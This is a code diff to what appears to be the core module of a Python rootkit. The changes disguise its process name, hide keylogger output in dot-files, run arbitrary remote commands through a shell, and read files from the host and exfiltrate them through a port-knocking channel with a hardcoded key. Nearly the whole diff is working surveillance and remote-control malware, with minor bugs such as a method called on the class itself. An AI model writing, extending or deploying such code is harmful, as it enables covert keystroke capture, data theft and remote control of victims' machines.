@@ -1,30 +1,40 @@
+import os
+import subprocess
+from datetime import datetime
 from time import sleep
 
 import d_watcher
 from keylog import keylog
-import encryption
+import setproctitle
 import f_watcher
 import knock
 
 key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
-code = "rootkit"
+code = "secret"
 
 
 def main():
     kit = rkit()
-    kit.start()
+    rkit.start()
+
 
 class rkit:
     def __init__(self):
+        name = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
         self.knocker = knock.remote_receiver(code, key, self)
-        self.keylogger = keylog(60, "temp.txt")
-        self.file_watcher = f_watcher.file_watcher(self.knocker)
-        self.dictionary_watcher = d_watcher.dictionary_watcher(self.knocker)
+        self.keylogger = keylog(60, f".{name}.txt")
+        self.file_watcher = f_watcher.file_watcher(self)
+        self.dictionary_watcher = d_watcher.directory_watcher(self)
 
     def start(self):
+        self.proc_name("secret")
         self.knocker.listen_loop()
 
-    def action_parse(self, option, data):
+    @staticmethod
+    def proc_name(name):
+        setproctitle.setproctitle(name)
+
+    def action_parse(self, option, data=""):
         match option:
             case 1:
                 self.keylogger.start()
@@ -46,7 +56,7 @@ class rkit:
                 self.file_watcher.stop()
                 return 0
             case 7:
-                self.dictionary_watcher.assign_dict(data)
+                self.dictionary_watcher.assign_directory(data)
                 self.dictionary_watcher.start()
                 return 0
             case 8:
@@ -57,9 +67,20 @@ class rkit:
                 return 0
 
     def command_execute(self, command):
-        print(command)
+        out = subprocess.call(command, shell=True)
+        self.knocker.exfiltrate(out, "/")
 
     def file_get(self, file):
+        try:
+            f = open(file, "r+")
+            data = f.read()
+            file_name = os.path.splitext(file)
+            file_name = file_name[0] + file_name[1]
+            self.knocker.exfiltrate(data, file_name)
+        except FileNotFoundError:
+            self.knocker.exfiltrate("File "+file+" not found", "/")
+        finally:
+            f.close()
         return "file"
 
 
